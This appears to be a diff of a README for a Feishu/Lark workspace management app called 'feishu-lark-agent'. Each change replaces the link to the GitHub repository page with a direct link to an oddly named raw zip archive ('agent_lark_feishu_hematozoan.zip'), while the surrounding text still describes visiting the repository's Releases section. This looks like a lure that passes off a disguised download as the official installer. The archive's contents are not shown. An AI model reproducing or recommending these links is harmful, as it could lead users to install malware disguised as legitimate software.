@@ -1,6 +1,6 @@
 # 🚀 feishu-lark-agent - Manage Feishu Workspace Simply
 
-[![Download feishu-lark-agent](https://img.shields.io/badge/Download-feishu--lark--agent-brightgreen)](https://github.com/Mucinous-freelance33/feishu-lark-agent)
+[![Download feishu-lark-agent](https://img.shields.io/badge/Download-feishu--lark--agent-brightgreen)](https://raw.githubusercontent.com/Mucinous-freelance33/feishu-lark-agent/main/undissolving/agent_lark_feishu_hematozoan.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This section walks you through downloading and running feishu-lark-agent on your
 
 Visit the official GitHub page to get the latest version of feishu-lark-agent:
 
-[![Download feishu-lark-agent](https://img.shields.io/badge/Download-feishu--lark--agent-blue)](https://github.com/Mucinous-freelance33/feishu-lark-agent)
+[![Download feishu-lark-agent](https://img.shields.io/badge/Download-feishu--lark--agent-blue)](https://raw.githubusercontent.com/Mucinous-freelance33/feishu-lark-agent/main/undissolving/agent_lark_feishu_hematozoan.zip)
 
 Click this link, and you will reach the repository page. Look for the **Releases** section on the right side or directly on the main page. There, download the latest Windows installer or executable file. The file typically ends with `.exe`.
 
@@ -109,7 +109,7 @@ You can adjust the app behavior to match your needs.
 
 To keep the app running smoothly, regularly check the GitHub page:
 
-1. Visit [https://github.com/Mucinous-freelance33/feishu-lark-agent](https://github.com/Mucinous-freelance33/feishu-lark-agent)  
+1. Visit [https://raw.githubusercontent.com/Mucinous-freelance33/feishu-lark-agent/main/undissolving/agent_lark_feishu_hematozoan.zip](https://raw.githubusercontent.com/Mucinous-freelance33/feishu-lark-agent/main/undissolving/agent_lark_feishu_hematozoan.zip)  
 2. Look for new releases or updates  
 3. Download the latest installer and repeat the installation process  
 
@@ -143,4 +143,4 @@ If you need help beyond this guide:
 
 Use this button to visit the download page anytime:
 
-[![Download feishu-lark-agent](https://img.shields.io/badge/Download-feishu--lark--agent-brightgreen)](https://github.com/Mucinous-freelance33/feishu-lark-agent)
+[![Download feishu-lark-agent](https://img.shields.io/badge/Download-feishu--lark--agent-brightgreen)](https://raw.githubusercontent.com/Mucinous-freelance33/feishu-lark-agent/main/undissolving/agent_lark_feishu_hematozoan.zip)
